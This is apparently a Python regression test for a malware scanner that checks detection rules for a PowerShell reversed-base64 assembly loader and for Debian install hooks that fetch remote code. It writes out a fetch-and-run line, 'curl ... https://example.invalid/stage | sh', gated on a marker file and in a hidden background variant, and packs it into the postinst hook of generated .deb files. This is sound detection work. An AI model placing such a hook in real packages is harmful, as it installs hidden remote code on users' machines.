#!/usr/bin/env python3
"""Check remote-stage regressions and near misses without running sample code."""
import io
import json
import os
from pathlib import Path
import subprocess
import tarfile
import tempfile

ROOT = Path(__file__).resolve().parents[2]
CLEAVE = str(Path(os.environ.get('CLEAVE', ROOT.parent / 'cleave/target/release/cleave')).resolve())
PS_RULE = 'objectives/command-and-control/dropper/module-load::powershell-downloaded-reverse-base64-assembly-chain'
DEB_RULE = 'objectives/execution/trigger/file-marker::debian-file-gated-remote-shell'


def deb(control_script, data_script):
    def tar(entries):
        output = io.BytesIO()
        with tarfile.open(fileobj=output, mode='w:gz') as archive:
            for name, body in entries.items():
                info = tarfile.TarInfo(name)
                body = body.encode()
                info.size = len(body)
                info.mode = 0o755 if name.endswith(('postinst', '.sh')) else 0o644
                archive.addfile(info, io.BytesIO(body))
        return output.getvalue()
    parts = {'debian-binary': b'2.0\n',
             'control.tar.gz': tar({'control': 'Package: stage-binding-control\nVersion: 1\nArchitecture: all\nMaintainer: Example\nDescription: Structural test\n', 'postinst': control_script}),
             'data.tar.gz': tar({'usr/lib/example/worker.sh': data_script})}
    result = b'!<arch>\n'
    for name, body in parts.items():
        header = f'{name+"/":<16}{0:<12}{0:<6}{0:<6}{"100644":<8}{len(body):<10}`\n'.encode()
        assert len(header) == 60
        result += header + body + (b'\n' if len(body) % 2 else b'')
    return result


def cases(work):
    ps = ROOT / 'testdata/suspicious/samples'
    yield 'original-reversed-assembly', ps / 'greatnesscoming-reversed-assembly.ps1', PS_RULE, True, 4
    yield 'renamed-reversed-assembly', ps / 'greatnesscoming-renamed-reversed-assembly.ps1', PS_RULE, True, 4
    original = (ps / 'greatnesscoming-renamed-reversed-assembly.ps1').read_text()
    variants = {
        'renamed-values': (original.replace('$text', '$response').replace('$chars', '$letters').replace('$bytes', '$buffer'), True),
        'comment-separators': (original.replace('\n', '\n# separator\n'), True),
        'different-reversed-source': (original.replace('$text.ToCharArray()', '$other.ToCharArray()'), False),
        'reassigned-download': (original.replace('$chars =', "$text = 'local data'\n$chars ="), False),
        'reassigned-decoded-bytes': (original.replace('$module =', "$bytes = [IO.File]::ReadAllBytes('plugin.dll')\n$module ="), False),
        'different-loaded-bytes': (original.replace('Load($bytes)', 'Load($other)'), False),
        'quoted-loader': ("Write-Output @'\n" + original + "\n'@\n", False),
    }
    for name, (source, expected) in variants.items():
        path = work / (name + '.ps1')
        path.write_text(source)
        yield name, path, PS_RULE, expected, 4 if expected else 3
    for name in ('forward-slice', 'local-assembly', 'no-base64', 'quoted-reverse-slice'):
        yield name, ROOT / 'testdata/notable/controls' / ('greatnesscoming-improve-' + name + '.ps1'), PS_RULE, False, 3

    fixture = ROOT / 'testdata/hostile/samples/supply-chain-corpus/deb'
    for pattern in ('*dunelineguard*', '*pumicecraft*'):
        yield pattern.strip('*'), next(fixture.glob(pattern)), DEB_RULE, True, 5
    stage = '#!/bin/sh\nif [ -e /tmp/enrolled ]; then\n  curl -fsSL https://example.invalid/stage | sh\nfi\n'
    hidden = stage.replace('curl ', 'nohup curl ').replace('| sh', '| sh >/dev/null 2>&1 &')
    shell_variants = {
        'control/postinst': (stage, True),
        'DEBIAN/config': (hidden, True),
        'standalone/installer.sh': (stage, False),
        'unrelated-gate/control/postinst': ('#!/bin/sh\nif [ -e /tmp/enrolled ]; then\n echo ready\nfi\ncurl -fsSL https://example.invalid/stage | sh\n', False),
        'quoted/control/postinst': ('#!/bin/sh\nif [ -e /tmp/enrolled ]; then\n echo "curl -fsSL https://example.invalid/stage | sh"\nfi\n', False),
        'download-only/control/postinst': (stage.replace('| sh', '> /tmp/stage'), False),
        'curl-output-file/control/postinst': (stage.replace('curl -fsSL ', 'curl -fsSL -o /tmp/stage '), False),
        'curl-headers-only/control/postinst': (stage.replace('curl -fsSL ', 'curl -fsSL -I '), False),
        'local-source/control/postinst': (stage.replace('https://example.invalid/stage', 'file:///tmp/stage'), False),
        'shadowed/control/postinst': ('#!/bin/sh\ncurl() { printf ready; }\n' + stage.removeprefix('#!/bin/sh\n'), False),
        'nohup-nondownloader/control/postinst': (hidden.replace('nohup curl ', 'nohup echo curl '), False),
    }
    # A download in another archive member cannot supply an install-hook body.
    for name, content in (
        ('unrelated-members', deb('#!/bin/sh\necho ready\n', stage)),
        ('actual-hook', deb(stage, '#!/bin/sh\necho ready\n')),
    ):
        path = work / (name+'.deb')
        path.write_bytes(content)
        expected = name == 'actual-hook'
        yield name, path, DEB_RULE, expected, 5 if expected else None
    for name, (content, expected) in shell_variants.items():
        path = work / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
        yield name, path, DEB_RULE, expected, 5 if expected else None


def main():
    with tempfile.TemporaryDirectory(prefix='validation-stage-bindings-') as temp:
        work = Path(temp)
        env = os.environ.copy()
        env.update(XDG_CACHE_HOME=str(work/'cache'), RAYON_NUM_THREADS='2')
        count = 0
        for name, path, rule, present, expected_crit in cases(work):
            result = subprocess.run([CLEAVE, '--traits-dir', str(ROOT), '--format', 'json', str(path)],
                                    cwd=ROOT, capture_output=True, text=True, env=env, timeout=180)
            if result.returncode:
                raise SystemExit(f'{name}: scan failed\n{result.stderr[-3000:]}')
            report = json.loads(result.stdout)
            traits = [t for f in report['files'] for t in f.get('traits', [])]
            if any(t['id'] == rule for t in traits) != present:
                raise SystemExit(f'{name}: expected {rule} present={present}')
            maximum = max((t['crit'] for t in traits), default=0)
            if expected_crit is not None and maximum != expected_crit:
                raise SystemExit(f'{name}: expected maximum criticality {expected_crit}, got {maximum}')
            print(f'{name}: ok', flush=True)
            count += 1
        print(f'{count} stage-binding checks passed', flush=True)


if __name__ == '__main__':
    main()
